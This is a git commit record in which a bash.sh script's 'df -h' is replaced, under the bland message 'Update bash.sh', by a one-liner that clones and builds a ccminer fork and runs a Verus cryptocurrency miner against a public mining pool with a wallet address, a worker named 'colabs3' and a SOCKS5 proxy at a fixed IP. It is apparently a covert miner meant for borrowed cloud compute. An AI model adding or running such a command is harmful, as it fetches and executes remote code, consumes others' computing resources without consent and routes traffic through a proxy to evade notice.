3380f6b1ccdd577a7586f1b7790126b962a6a3df
ganssjr <76063071+ganssjr@users.noreply.github.com>
2022-05-24 22:23:56 +0700

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -1,1 +1,1 @@
-df -h
+git clone –single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer  -a verus  -o stratum+tcp://eu.luckpool.net:3956  -u RRT2bJnHu9n1Qzh4crRZZKFoX3HXrtTDer.colabs3  -p x  -t 5 -x sock5//174.70.241.8:24398
